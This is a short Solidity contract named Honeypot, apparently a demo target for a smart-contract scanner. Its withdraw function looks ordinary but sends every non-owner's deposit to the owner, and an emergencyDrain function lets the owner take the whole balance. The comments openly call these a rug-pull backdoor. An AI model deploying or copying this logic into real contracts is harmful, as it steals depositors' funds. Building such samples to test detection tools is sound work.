// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Honeypot {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // Vulnerable to reentrancy? No, this is a honeypot.
    // Actually, let's make a classic "HoneyPot": seems vulnerable but traps you.
    // Or just a clearly malicious contract for the scanner to find.
    // Let's make a "Hidden Fee" token or a "Blacklist" contract.
    // Or a classic Reentrancy Honeypot: It looks like it has reentrancy but reverts if you try.
    
    // For this demo, let's make a "RugPull" style contract that owner can drain.
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public {
        // Looks normal...
        require(balances[msg.sender] > 0, "No balance");
        
        // ...but hidden mechanism (only for demo, simple backdoor)
        // In a real scan, we look for owner privileges.
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        
        // "Fee" of 100% if not owner
        if (msg.sender != owner) {
             // Rug: send to owner instead
             payable(owner).transfer(amount);
        } else {
             payable(msg.sender).transfer(amount);
        }
    }
    
    function emergencyDrain() public {
        require(msg.sender == owner, "Owner only");
        payable(owner).transfer(address(this).balance);
    }
}
